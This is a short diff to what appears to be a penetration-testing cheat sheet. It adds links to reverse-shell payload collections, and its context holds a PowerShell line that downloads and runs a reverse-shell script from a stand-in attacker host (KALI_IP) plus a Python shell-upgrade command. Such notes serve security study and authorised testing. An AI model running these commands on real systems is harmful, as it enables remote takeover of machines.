@@ -1026,6 +1026,11 @@ If it is not, invoke 64 bit reverse powershell call
 C:\Windows\sysNative\windows\powershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')
 ```
 
+### Useful Reverse shell payload 
+[Windows Powershell](https://github.com/samratashok/nishang/tree/master/Shells)
+
+[Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+
 ### Upgrade simple shell to tty shell to fully interactive shell
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
